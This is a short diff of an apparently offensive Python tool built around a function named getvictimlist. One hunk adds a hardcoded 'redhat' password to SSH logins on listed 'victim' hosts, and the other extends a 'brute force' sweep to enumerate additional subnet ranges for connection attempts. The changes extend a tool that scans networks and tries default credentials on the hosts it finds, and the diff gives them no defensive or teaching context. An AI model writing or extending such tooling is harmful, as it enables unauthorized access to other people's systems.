@@ -27,7 +27,7 @@ def getvictimlist(configs):
 
         for victimentry in victimlist:
             try:
-                victims.append(ssh(user=victimentry[0], host=victimentry[1], keyfile=configs["KeyFile"]))
+                victims.append(ssh(user=victimentry[0], host=victimentry[1], password="redhat", keyfile=configs["KeyFile"]))
             except:
                 continue
         if len(victims) == 0:
@@ -82,9 +82,15 @@ def getvictimlist(configs):
             t.start()
 
         print(cs.status, "Brute force starting...")
-        for networkportion in network:
-            for digit in range(255):
-                q.put(networkportion + str(digit))
+        if network[0].count('.') == 3:
+            for networkportion in network:
+                for digit in range(255):
+                    q.put(networkportion + str(digit))
+        else:
+            for networkportion in network:
+                    for i in range(12, 14):
+                        for k in range(255):
+                            q.put(networkportion + str(i) + '.' + str(k))
 
         q.join()
         print(cs.status, "Brute force time taken: ", '{:.2f}'.format(time.time() - start), "seconds\n")
